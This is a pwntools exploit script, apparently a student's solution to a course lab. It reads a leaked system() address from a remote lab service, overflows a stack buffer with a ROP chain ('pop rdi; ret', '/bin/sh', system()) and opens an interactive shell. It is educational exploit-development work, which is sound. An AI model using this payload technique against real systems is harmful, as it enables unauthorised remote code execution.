from pwn import *

# Set CPU context architecture
context.arch = "amd64"

# Launch exploit process 
#p = gdb.debug("./lab4-1.bin")            # run exploit against binary locally with process attached to gdb
#p = process("./lab4-1.bin")              # run exploit against binary locally without attacking the process to gdb 
p = remote("csc748.hostbin.org", 7041)   # run the exploit against a remote process

# Receive system() pointer address and print the value
print("*****************************************")
p.recvuntil("@ ")
address =  p.recvuntil("\n").decode("utf-8")
print(type(address))
print("The received leaked value of system() address is: ", address)

# Remove the new line charactor (\n) from the  leaked system() address string
address =  address[:len(address)-1] 
print("The leaked address of system() as a string value without the new line is: ", address)
print("")

# Convert the leaked system() address to Base16 Integer for p64() payload input
addressBase16Int = int(address, 16)
print(type(addressBase16Int))
print("The leaked address of system() as base 16 interger value is: ", addressBase16Int)
print("")

# Print the leaked system() address as hex string
addressHex = hex(addressBase16Int)
print(type(addressHex))
print("The leaked adress of system() as hexadecimal value is: ", addressHex)
print("")

# Payload
payload = b""                               # initial payload variable
payload += (b"A"*32 + b"B"*8)               # Padding bytes to overflow target buffer up to including RBP
payload += p64(0x40101a)                    #  NOP for stack alignment
payload += p64(0x401423)                    # pointer addres to ROP gadget "pop rdi; ret;" to pop string "/bin/sh" to RDI
payload += p64(0x4030d0)                    # pointer addres to "/bin/sh", the only arguement to system()
payload += p64(addressBase16Int)            # pointer to system() based on dynamic output of the remote binary process w/ASLR

# print Payload
print("The final payload is : ", payload)
print("")

# Send payload
p.sendline(payload)

# Switch to interactive
p.recv()
p.interactive()

